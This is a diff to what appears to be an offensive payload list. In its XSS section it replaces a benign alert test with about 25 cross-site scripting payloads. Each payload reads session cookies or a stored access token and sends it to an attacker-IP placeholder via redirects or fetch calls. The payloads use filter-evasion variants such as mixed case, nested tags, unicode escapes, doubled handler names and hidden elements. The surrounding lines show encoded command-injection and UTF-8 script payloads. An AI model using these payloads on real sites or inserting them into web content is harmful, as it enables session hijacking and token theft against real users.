@@ -166,7 +166,34 @@ ping %E2%91%A0%E2%91%A1%E2%91%A6.%E2%93%AA.%E2%93%AA.%E2%91%A0
  
 
 ==> XSS injection
-<script>alert('xss');</script>
+<script>var x;x=document.cookie; document.location.replace('http://<ATTACKER_IP>/c=1&'+x)</script>
+<script>var x;x=localStorage.getItem('access_token'); document.location.replace('http://<ATTACKER_IP>/c=2&'+x)</script>
+<script>document.location='http://<ATTACKER_IP>/?c=3&'+btoa(document.cookie)</script>
+<script>document.location='http://<ATTACKER_IP>/?c=4&'+btoa(localStorage.getItem('access_token'))</script>
+<img style="display: none;" src=x onerror="fetch('http://<ATTACKER_IP>/?c=6&'+btoa(document.cookie))">
+<iframe style="display:none" src=javascript:void(document.location="http://<ATTACKER_IP>/?c=7&"+document.cookie)></iframe>
+"><script> var x;x=document.cookie; document.location.replace('http://<ATTACKER_IP>/c=8&'+x)</script>
+<sCriPt> var x;x=document.cookie; document.location.replace('http://<ATTACKER_IP>/c=9&'+x)</scRIpT>
+<script x> var x;x=document.cookie; document.location.replace('http://<ATTACKER_IP>/c=10&'+x)</script>
+<scr<script>ipt> var x;x=document.cookie; document.location.replace('http://<ATTACKER_IP>/c=11&'+x)</scr<script>ipt>
+<script> var x;x=\u0064ocument.\u0063ookie; \u0064ocument.location.replace('http://<ATTACKER_IP>/c=12&'+x)</script>
+<img style="display: none;" src=x oneonerrorrror="fetch('http://<ATTACKER_IP>/?c=13&'+btoa(document.cookie))">
+"><img style="display: none;" src=x onerror="fetch('http://<ATTACKER_IP>/?c=14&'+btoa(document.cookie))">
+<svg onload="fetch('http://<ATTACKER_IP>/?c=15&'+btoa(document.cookie))">
+<svg onload="fetch('http://<ATTACKER_IP>/?c=16&'+btoa(\u0064ocument.cookie))">
+<svg onlonloadoad="fetch('http://<ATTACKER_IP>/?c=17&'+btoa(document.cookie))">
+"><svg onload="fetch('http://<ATTACKER_IP>/?c=18&'+btoa(document.cookie))">
+<div onpointerover="fetch('http://<ATTACKER_IP>/?c=19&'+btoa(document.cookie))">MOVE HERE</div>
+<div onpointerover="fetch('http://<ATTACKER_IP>/?c=20&'+btoa(\u0064ocument.cookie))">MOVE HERE</div>
+"><div onpointerover="fetch('http://<ATTACKER_IP>/?c=21&'+btoa(document.cookie))">MOVE HERE</div>
+<div onpoonpointeroverinterover="fetch('http://<ATTACKER_IP>/?c=22&'+btoa(document.cookie))">MOVE HERE</div>
+<body onload="fetch('http://<ATTACKER_IP>/?c=23&'+btoa(document.cookie))">
+<body onload="fetch('http://<ATTACKER_IP>/?c=24&'+btoa(\u0064ocument.cookie))">
+"><body onload="fetch('http://<ATTACKER_IP>/?c=25&'+btoa(document.cookie))">
+<body ononloadload="fetch('http://<ATTACKER_IP>/?c=26&'+btoa(document.cookie))">
+
+
+
 == UTF-8 encoding
 %EF%BC%9Cscript%EF%BC%9Ealert('xss');%EF%BC%9C/script%EF%BC%9E
 
